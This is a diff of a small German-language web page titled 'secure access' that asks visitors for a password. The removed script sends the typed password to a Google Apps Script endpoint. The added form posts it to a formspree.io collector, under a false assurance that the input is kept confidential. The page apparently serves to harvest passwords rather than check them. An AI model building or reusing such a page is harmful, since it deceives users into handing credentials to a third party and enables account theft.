@@ -63,29 +63,11 @@
 <body>
   <div class="container">
     <h1>🔐 Zugang sichern</h1>
-    <input type="password" id="pw" placeholder="Passwort eingeben" />
-    <button onclick="submitPassword()">Absenden</button>
-    <div id="msg" class="message"></div>
+    <form action="https://formspree.io/f/xyzwyzzg" method="POST">
+      <input type="password" name="password" placeholder="Passwort eingeben" required />
+      <button type="submit">Absenden</button>
+    </form>
+    <div class="message">🔒 Deine Eingabe wird vertraulich behandelt.</div>
   </div>
-
-  <script>
-    function submitPassword() {
-      const pw = document.getElementById("pw").value;
-      const msg = document.getElementById("msg");
-
-      const url = "https://script.google.com/macros/s/AKfycbx4VOClu70N3wzvVnPQrHg7bYRkl9VpZUTOwcbdZKvxtDE-poCyN8z_T_xO9_hnyojY/exec?password=" + encodeURIComponent(pw);
-
-      fetch(url)
-        .then(res => res.text())
-        .then(data => {
-          msg.innerHTML = "✅ Gespeichert!";
-          document.getElementById("pw").value = "";
-        })
-        .catch(err => {
-          msg.innerHTML = "❌ Fehler beim Senden.";
-          console.error(err);
-        });
-    }
-  </script>
 </body>
 </html>
